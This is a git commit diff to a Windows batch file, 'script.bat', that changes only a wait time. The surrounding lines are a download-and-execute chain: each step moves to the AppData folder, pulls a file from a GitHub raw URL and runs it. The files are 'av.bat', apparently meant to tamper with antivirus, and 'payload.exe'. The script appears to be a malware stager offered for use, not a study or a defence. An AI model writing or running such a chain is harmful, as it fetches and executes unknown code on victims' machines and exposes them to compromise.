4fb96d68871f9d567a3f95feafa4fa197d57a066
ishanarya24 <91789624+ishanarya24@users.noreply.github.com>
2021-10-07 02:43:01 +0530

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,5 +1,5 @@
 cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/av.bat -O
 cmd /c av.bat
-timeout 25
+timeout 15
 cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/payload.exe -O
 cmd /c payload.exe
